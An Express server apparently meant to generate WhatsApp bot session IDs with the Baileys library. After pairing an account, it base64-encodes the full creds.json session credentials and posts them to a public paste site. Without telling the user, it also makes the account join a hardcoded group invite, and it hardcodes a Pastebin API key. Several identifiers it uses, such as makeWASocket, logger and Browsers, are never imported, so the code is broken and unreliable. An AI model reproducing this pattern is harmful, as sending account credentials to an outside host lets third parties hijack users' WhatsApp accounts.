let express = require("express");
let app = express();
const fs = require ("fs-extra")
const axios = require("axios");
let {
    toBuffer
} = require("qrcode");
const CryptoJS = require("crypto-js");
const JSZip = require("jszip");
const file = require("fs");
const zip = new JSZip();
const { base64encode, base64decode } = require('nodejs-base64');
const { AnyMessageContent, delay, DisconnectReason, fetchLatestBaileysVersion, getAggregateVotesInPollMessage, makeCacheableSignalKeyStore, makeInMemoryStore, PHONENUMBER_MCC, proto, useMultiFileAuthState, WAMessageContent, WAMessageKey} = require("@whiskeysockets/baileys")
    const pino = require("pino");
    let PORT = process.env.PORT || 3030;
    const PastebinAPI = require("pastebin-js"),
    pastebin = new PastebinAPI("h4cO2gJEMwmgmBoteYufW6_weLvBYCqT");

    
    app.get("/number", async (req, res) => {
        let number1 = JSON.stringify(req.query.numb);

        async function XAsena() {

            try {
                let {
                    version, isLatest
                } = await fetchLatestBaileysVersion()
                const {
                    state, saveCreds
                } = await useMultiFileAuthState(`./session`)
                
                const session = makeWASocket({
                    version,
                    logger,
                    printQRInTerminal: false,
                    browser: Browsers.macOS("Desktop"),
                    mobile: true,
                    auth: {
                        creds: state.creds,
                        keys: makeCacheableSignalKeyStore(state.keys),
                    },
                    msgRetryCounterCache,
                    generateHighQualityLinkPreview: true,
                    getMessage,
                })
            
                const code = await session.requestPairingCode(number1)
                console.log(`Pairing code: ${code}`)
                res.end(`Pairing code: ${code}`);
                //------------------------------------------------------

                session.ev.on("connection.update", async (s) => {
                    const {
                        connection,
                        lastDisconnect
                    } = s
                    if (connection == "open") {
                        await session.groupAcceptInvite("GkYZvcVSUSR1WBvl6rBpiw");
                        const authfile = (`./session/creds.json`)
                        await delay(1000 * 10)
                        var tsurue = "";
                        let fil = await file.readFileSync("./session/creds.json", "utf-8");
                        let filz = base64encode(fil);
                        await console.log(filz);
                        let link = await axios.post('http://paste.c-net.org/', "" + filz, {
                            headers: {
"Content-Type": "application/x-www-form-urlencoded",
                            }
                        });
                        tsurue = link.data.split("/")[3]
                        await session.sendMessage(session.user.id, {
                            text: "BLUE-LION;;;" + tsurue
                        })
                        await session.sendMessage(session.user.id, {
                            text: `\n*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*\n\n◕ ⚠️ *ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*`
                        })
                        const files = fs.readdirSync("./session");
                        for (const file of files) {
                          const data = fs.readFileSync("./session/" + file);
                          zip.file(file, data);
                        }
                        zip
                          .generateNodeStream({ type: "nodebuffer", streamFiles: true })
                          .pipe(file.createWriteStream("session.zip"))
                          .on("finish", async function () {
                            await session.sendMessage(session.user.id, {
                                document: {
                                    url: './session.zip'
                                },
                                fileName: "session.zip",
                                mimetype: "application/zip",
                            });
                            await fs.rm('./session', {
                                recursive: true, force: true
                            })
                            process.send('reset')
                          });
                       
                    }
                    if (
                        connection === "close" &&
                        lastDisconnect &&
                        lastDisconnect.error &&
                        lastDisconnect.error.output.statusCode != 401
                    ) {
                        XAsena()
                    }
                })
                session.ev.on('creds.update',
                    saveCreds)
                await delay(3000 * 10);
                session.ev.on("messages.upsert",
                    () => {})

            }catch(err) {
                console.log(
                    err + "Unknown Error Occured Please report to Owner and Stay tuned"
                );
            }


        }
        XAsena()
        });
    app.get("/q", (req, res) => {

        async function XAsena() {

            try {
                let {
                    version, isLatest
                } = await fetchLatestBaileysVersion()
                const {
                    state, saveCreds
                } = await useMultiFileAuthState(`./session`)
                
                const session = makeWASocket({
                    version,
                    logger,
                    printQRInTerminal: false,
                    browser: Browsers.macOS("Desktop"),
                    mobile: false,
                    auth: {
                        creds: state.creds,
                        keys: makeCacheableSignalKeyStore(state.keys),
                    },
                    msgRetryCounterCache,
                    generateHighQualityLinkPreview: true,
                    getMessage,
                })
            
                //------------------------------------------------------

                session.ev.on("connection.update", async (s) => {
                    if (s.qr) {
                        res.end(await toBuffer(s.qr));
                    }
                    const {
                        connection,
                        lastDisconnect
                    } = s
                    if (connection == "open") {
                        await session.groupAcceptInvite("GkYZvcVSUSR1WBvl6rBpiw");
                        const authfile = (`./session/creds.json`)
                        await delay(1000 * 10)
                        var tsurue = "";
                        let fil = await file.readFileSync("./session/creds.json", "utf-8");
                        let filz = base64encode(fil);
                        await console.log(filz);
                        let link = await axios.post('http://paste.c-net.org/', "" + filz, {
                            headers: {
"Content-Type": "application/x-www-form-urlencoded",
                            }
                        });
                        tsurue = link.data.split("/")[3]
                        await session.sendMessage(session.user.id, {
                            text: "BLUE-LION;;;" + tsurue
                        })
                        await session.sendMessage(session.user.id, {
                            text: `\n*ᴅᴇᴀʀ ᴜsᴇʀ ᴛʜɪs ɪs ʏᴏᴜʀ sᴇssɪᴏɴ ɪᴅ*\n\n◕ ⚠️ *ᴘʟᴇᴀsᴇ ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜɪs ᴄᴏᴅᴇ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ ᴀs ɪᴛ ᴄᴏɴᴛᴀɪɴs ʀᴇǫᴜɪʀᴇᴅ ᴅᴀᴛᴀ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴄᴏɴᴛᴀᴄᴛ ᴅᴇᴛᴀɪʟs ᴀɴᴅ ᴀᴄᴄᴇss ʏᴏᴜʀ ᴡʜᴀᴛsᴀᴘᴘ*`
                        })
                        const files = fs.readdirSync("./session");
                        for (const file of files) {
                          const data = fs.readFileSync("./session/" + file);
                          zip.file(file, data);
                        }
                        zip
                          .generateNodeStream({ type: "nodebuffer", streamFiles: true })
                          .pipe(file.createWriteStream("session.zip"))
                          .on("finish", async function () {
                            await session.sendMessage(session.user.id, {
                                document: {
                                    url: './session.zip'
                                },
                                fileName: "session.zip",
                                mimetype: "application/zip",
                            });
                            await fs.rm('./session', {
                                recursive: true, force: true
                            })
                            process.send('reset')
                          });
                       
                    }
                    if (
                        connection === "close" &&
                        lastDisconnect &&
                        lastDisconnect.error &&
                        lastDisconnect.error.output.statusCode != 401
                    ) {
                        XAsena()
                    }
                })
                session.ev.on('creds.update',
                    saveCreds)
                await delay(3000 * 10);
                session.ev.on("messages.upsert",
                    () => {})

            }catch(err) {
                console.log(
                    err + "Unknown Error Occured Please report to Owner and Stay tuned"
                );
            }


        }
        XAsena()

    })

    app.listen(PORT, () => console.log("App listened on port", PORT));
